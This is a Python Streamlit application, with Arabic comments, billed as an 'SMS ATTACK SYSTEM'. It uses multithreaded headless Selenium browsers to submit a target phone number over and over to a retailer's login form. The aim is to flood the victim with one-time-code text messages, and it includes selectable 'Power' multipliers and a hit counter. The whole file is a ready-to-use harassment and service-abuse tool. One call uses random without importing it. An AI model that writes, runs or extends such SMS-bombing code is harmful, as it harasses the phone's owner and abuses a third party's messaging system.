import streamlit as st
import threading
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات الصفحة المظهر ---
st.set_page_config(page_title="ULTIMATE SMS SNIPER v8.0", page_icon="🎯", layout="centered")

st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: #2ecc71; }
    .stButton>button { width: 100%; border-radius: 10px; font-weight: bold; height: 3em; }
    .stTextInput>div>div>input { color: #2ecc71; background-color: #1e1e1e; }
    .status-box { padding: 20px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #2ecc71; margin-bottom: 20px; }
    </style>
    """, unsafe_allow_html=True)

# --- تهيئة الـ Session State (عشان البيانات متتمسحش مع كل ريفريش) ---
if 'is_running' not in st.session_state: st.session_state.is_running = False
if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'start_time' not in st.session_state: st.session_state.start_time = None

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 50: st.session_state.logs.pop(0)

def run_btech_cycle(phone, thread_id):
    options = Options()
    options.add_argument("--headless=new") 
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_argument('--blink-settings=imagesEnabled=false')
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 15)
        
        add_log(f"Thread-{thread_id}: Opening B.TECH...")
        driver.get("https://btech.com/ar/account")
        time.sleep(1)

        add_log(f"Thread-{thread_id}: Clicking Login...")
        red_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'تسجيل دخول') or contains(., 'إنشاء حساب')]")))
        red_button.click()

        add_log(f"Thread-{thread_id}: Sending SMS to {phone}...")
        phone_input = wait.until(EC.presence_of_element_located((By.ID, "phone")))
        phone_input.send_keys(phone)
        phone_input.send_keys("\ue007")
        
        time.sleep(2)
        st.session_state.count += 1
        add_log(f"Thread-{thread_id}: ✅ SUCCESS! Hit confirmed.")
    except Exception:
        add_log(f"Thread-{thread_id}: ❌ ERROR - Retrying...")
    finally:
        if driver: driver.quit()

def attack_manager(phone, multiplier):
    # تشغيل عدد من الـ Threads بناءً على الـ Multiplier
    while st.session_state.is_running:
        threads = []
        for i in range(multiplier):
            if not st.session_state.is_running: break
            t = threading.Thread(target=run_btech_cycle, args=(phone, i+1))
            threads.append(t)
            t.start()
            time.sleep(0.3) # فاصل صغير بين بداية كل خيط
        
        for t in threads:
            t.join() # انتظار انتهاء الموجة الحالية قبل البدء في الجديدة
        time.sleep(1)

# --- واجهة المستخدم ---
st.title("🚀 SMS ATTACK SYSTEM")
st.caption("All Rights Reserved to Mahmoud Abdalla")

# المدخلات
col1, col2 = st.columns([3, 1])
with col1:
    phone = st.text_input("Target Phone Number", placeholder="01xxxxxxxxx")
with col2:
    multiplier_str = st.selectbox("Power", ["x1", "x2", "x3", "x5", "x10"])
    multiplier = int(multiplier_str.replace("x", ""))

# الإحصائيات الحية
st.markdown('<div class="status-box">', unsafe_allow_html=True)
stat_col1, stat_col2 = st.columns(2)
stat_col1.metric("TOTAL HITS", st.session_state.count)
if st.session_state.is_running and st.session_state.start_time:
    elapsed = int(time.time() - st.session_state.start_time)
    mins, secs = divmod(elapsed, 60)
    stat_col2.metric("TIME ELAPSED", f"{mins:02d}:{secs:02d}")
else:
    stat_col2.metric("TIME ELAPSED", "00:00")
st.markdown('</div>', unsafe_allow_html=True)

# أزرار التحكم
c_btn1, c_btn2 = st.columns(2)
if c_btn1.button("🔥 LAUNCH GHOST ATTACK", disabled=st.session_state.is_running):
    if phone:
        st.session_state.is_running = True
        st.session_state.count = 0
        st.session_state.start_time = time.time()
        st.session_state.logs = []
        add_log(f"--- ATTACK STARTED ON {phone} ---")
        st.rerun()
    else:
        st.error("Please enter a phone number!")

if c_btn2.button("🛑 TERMINATE ALL", disabled=not st.session_state.is_running):
    st.session_state.is_running = False
    add_log("--- SYSTEM TERMINATED BY USER ---")
    st.rerun()

# صندوق اللوجز
st.subheader("System Logs")
log_text = "\n".join(st.session_state.logs[::-1]) # الأحدث فوق
st.text_area(label="Terminal", value=log_text, height=300, label_visibility="collapsed")

# تشغيل العملية
if st.session_state.is_running:
    # ملاحظة: في الويب، بنستخدم Loop عشان نحدث الصفحة باستمرار
    run_btech_cycle(phone, random.randint(1, multiplier)) 
    time.sleep(0.5)
    st.rerun()
